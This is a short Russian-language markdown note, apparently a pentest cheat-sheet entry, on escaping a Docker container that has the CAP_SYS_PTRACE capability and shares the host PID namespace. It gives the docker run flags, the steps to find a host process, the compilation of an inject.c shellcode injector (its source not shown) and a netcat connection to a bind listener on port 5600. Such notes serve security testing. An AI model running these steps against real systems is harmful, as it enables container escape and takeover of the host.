# CAP_SYS_PTRACE

В контейнере должны быть установлены
```bash
apt install vim # or any other editor
apt install gcc
apt install net-tools
apt install netcat
```
И контейнер должен быть в хостовом PID пространстве

## CAP_SYS_PTRACE позволяет контейнеру подключаться к процессам на хост-системе и отслеживать их. Это может быть использовано для мониторинга и даже изменения поведения процессов на хосте.

Запуск python сервера
```bash
/usr/bin/python3 -m http.server 8080
```

Запуск контейнера
```bash
docker run -it --pid=host --cap-add=SYS_PTRACE --security-opt apparmor=unconfined ubuntu_golden_image:v01 bash
```

Эксплуатация уязвимости
```bash
# List process that runs on the host and container.
ps -eaf | grep "/usr/bin/python3 -m http.server 8080" | head -n 1
# Copy and paste the payload from inject.c
vim inject.c
gcc -o inject inject.c
# Inject the shellcode payload that will open a listener over port 5600
./inject <PID>
# Bind over port 5600
nc <HOST-IP> 5600
```